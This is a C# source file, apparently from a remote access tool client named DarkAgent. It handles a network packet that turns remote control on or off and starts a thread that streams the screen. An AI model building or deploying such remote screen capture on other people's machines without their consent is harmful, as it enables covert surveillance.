using System;
using System.Drawing;
using DarkAgent_Client.src.Network.FileNetwork.Packets.Send;
using DarkAgent_Client.src.Objects;
using System.Threading;

namespace DarkAgent_Client.src.Network.FileNetwork.Packets.Receive
{
    class R_RemoteControlScreen : ReceiveBasePacket
    {
        public R_RemoteControlScreen(FileTransferConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        byte Enable;
        public override void Read()
        {
            Enable = ReadByte();
        }

        public override void Run()
        {
            if(Enable == 1)
            {
                Client.EnableRemoteControl = true;
                Thread thread = new Thread(new ThreadStart(Client.SendRemoteScreen));
                thread.Start();

            }
            else if(Enable == 0)
            {
                Client.EnableRemoteControl = false;
            }
        }
    }
}